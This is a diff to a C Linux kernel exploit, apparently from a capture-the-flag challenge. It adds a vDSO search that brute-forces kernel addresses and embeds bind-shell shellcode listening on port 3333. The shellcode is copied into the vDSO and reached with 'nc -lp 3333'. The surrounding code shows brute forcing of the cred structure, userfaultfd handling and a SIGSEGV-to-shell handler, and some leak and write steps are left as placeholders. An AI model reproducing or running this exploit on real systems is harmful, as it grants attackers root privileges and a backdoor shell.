@@ -15,6 +15,7 @@
 #include <signal.h>
 #include <sys/prctl.h>
 #include <sys/stat.h>
+#include <sys/auxv.h> 
 
 #define TTY_STRUCT_MAGIC 0x0000000100005401
 
@@ -47,7 +48,6 @@ void logbuf(size_t *buf,int size){
 }
 void find_cred(){
     // 爆破kernel中的cred结构
-    setvbuf(stdout,0,2,0);
     char *buf=malloc(0x1000);
     char target[16]="Lewis tql";
     prctl(PR_SET_NAME,target);
@@ -79,6 +79,64 @@ void find_cred(){
     // ... write cred 
     // 0-0x28 = 0
 }
+void show_vdso_userspace(int len){
+	size_t addr=0;
+	addr = getauxval(AT_SYSINFO_EHDR);
+	if(addr<0){
+		puts("[-]cannot get vdso addr");
+		return ;
+	}
+	for(int i = len;i<0x1000;i++){
+		printf("%x ",*(char *)(addr+i));
+	}
+}
+int check_vsdo_shellcode(char *shellcode){
+	size_t addr=0;
+	addr = getauxval(AT_SYSINFO_EHDR);
+	printf("vdso:%lx\n", addr);
+	if(addr<0){
+		puts("[-]cannot get vdso addr");
+		return 0;
+	}	
+	if (memmem((char *)addr,0x1000,shellcode,strlen(shellcode) )){
+		return 1;
+	}
+	return 0;
+}
+void find_vsdo(){
+    // 爆破vsdo
+    size_t cred=0,real_cred=0;
+    size_t res=0;
+    char *buf=malloc(0x1000);
+    for(size_t addr=0xffffffff80000000;addr<0xffffffffffffefff;addr+=0x1000){
+        // ... some ways to leak data from kernel        
+
+        if(!strcmp("gettimeofday",buf+0x2cd)){
+            res=addr;
+            printf("[+] vdso: 0x%llx\n",res);
+            break;
+        }
+    }
+    if(res == 0){
+		puts("[-] not found , try again ");
+		exit(-1);
+	}
+    // res is vsdo base
+	
+    // write shellcode to 0xc80+res
+    // bind 127.0.0.1:3333
+    // https://gist.github.com/itsZN/1ab36391d1849f15b785
+    char shellcode[] = "\x90\x53\x48\x31\xC0\xB0\x66\x0F\x05\x48\x31\xDB\x48\x39\xC3\x75\x0F\x48\x31\xC0\xB0\x39\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x09\x5B\x48\x31\xC0\xB0\x60\x0F\x05\xC3\x48\x31\xD2\x6A\x01\x5E\x6A\x02\x5F\x6A\x29\x58\x0F\x05\x48\x97\x50\x48\xB9\xFD\xFF\xF2\xFA\x80\xFF\xFF\xFE\x48\xF7\xD1\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x07\x48\x31\xC0\xB0\xE7\x0F\x05\x90\x6A\x03\x5E\x6A\x21\x58\x48\xFF\xCE\x0F\x05\x75\xF6\x48\x31\xC0\x50\x48\xBB\xD0\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xD3\x53\x48\x89\xE7\x50\x57\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x0F\x05\x48\x31\xC0\xB0\xE7\x0F\x05";
+    // do write ...
+
+    if(check_vsdo_shellcode(shellcode)){
+        system("nc -lp 3333");
+    }
+    else{
+        printf("[-] error write to vsdo\n");
+    }
+}
+
 void pf_handler(long uffd){
     for(;;){
         struct pollfd pollfd[1]={0};
@@ -174,10 +232,10 @@ void sudo()
     );
 }
 
-
 int main()
 {
     mmap((void*)0x5000000,0x2000,PROT_EXEC|PROT_READ|PROT_WRITE,MAP_PRIVATE |MAP_ANON|MAP_FIXED | MAP_POPULATE , 0 , 0 );
+    setvbuf(stdout,0,2,0);
     signal(SIGSEGV,SHELL);    
     save_state();
     
